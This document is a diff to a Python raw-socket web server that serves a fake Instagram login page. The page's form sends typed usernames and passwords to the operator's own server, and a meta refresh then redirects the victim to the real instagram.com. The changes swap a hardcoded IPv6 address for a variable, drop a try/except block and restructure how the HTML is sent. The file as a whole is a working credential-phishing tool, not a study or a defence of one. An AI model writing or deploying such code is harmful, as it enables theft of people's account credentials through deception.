@@ -18,7 +18,7 @@ def listen():
         except:
             pass
 def handler(c, msg, ip):
-    try:
+
         already_requested = False
         c.send('HTTP/1.0 200 OK\n'.encode())
         c.send('Content-Type: text/html\n'.encode())
@@ -45,7 +45,7 @@ def handler(c, msg, ip):
             <meta http-equiv="Refresh" content="0; url='https://instagram.com/'" />          
             """.encode())
         if not already_requested:
-            c.send("""
+            msgtoclient = """
                                         <style>
                                             * {
                                           margin: 0px;
@@ -161,7 +161,7 @@ def handler(c, msg, ip):
                                               <img src="https://i.imgur.com/zqpwkLQ.png" />
                                             </div>
                                             <div class="l-part">
-                                              <form action="http://[2a02:908:4c10:42c0:87f:54a9:6121:f0f6]/">
+                                              <form action="http://"""+ip+"""">
                                                 <input type="text" placeholder="Username" class="input-1" name="username">
                                                 <div class="overlap-text">
                                                 <input type="password" placeholder="Password" name="password" style="width: 100%; margin-bottom: 5px; padding: 8px 12px; border: 1px solid #dbdbdb; box-sizing: border-box; border-radius: 3px;">
@@ -177,8 +177,8 @@ def handler(c, msg, ip):
                                             </div>
                                           </div>
                                         </div>
-                                                """.encode())
+                                                """
+            c.send(msgtoclient.encode())
         c.close()
-    except:
-        pass
+
 listen()
